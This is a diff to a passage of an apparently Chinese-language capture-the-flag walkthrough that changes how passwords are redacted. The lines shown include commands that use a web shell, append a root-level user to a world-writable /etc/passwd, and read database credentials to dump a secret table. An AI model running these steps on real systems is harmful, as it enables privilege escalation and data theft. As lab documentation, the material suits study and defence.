@@ -50,7 +50,7 @@ POST /pivot_shell.jsp cmd=id → uid=1000(tomcat9) gid=1000(tomcat9)
 
 ```
 ls -la /etc/passwd   → -rw-rw-rw- （666！entrypoint.sh 第 4 条：外包代维加固脚本误设，2025-11 未回滚）
-openssl passwd -1 -salt pivothub 'REDACTED********' → $1$pivothub$REDACTED
+openssl passwd -1 -salt pivothub 'REDACTED' → $1$pivothub$REDACTED
 echo 'pivot:$1$pivothub$...:0:0:root:/root:/bin/bash' >> /etc/passwd
 script -qec 'su - pivot' /dev/null        ← 造 PTY（su 必须 TTY）
 （面板 /api/shells/{id}/io 喂密码）
@@ -60,9 +60,9 @@ id → uid=0(root) gid=0(root)
 ### 1.5 内网库
 
 ```
-cat WEB-INF/db.properties → db.host=db01 db.user=archive db.pass=REDACTED********
+cat WEB-INF/db.properties → db.host=db01 db.user=archive db.pass=REDACTED
 getent hosts db01         → 172.33.0.20
-mysql -h db01 -u archive -p'REDACTED********' -D archive -e 'show tables'
+mysql -h db01 -u archive -p'REDACTED' -D archive -e 'show tables'
   → files / secret_vault
 select * from secret_vault → flag{t4-REDACTED}
 ```
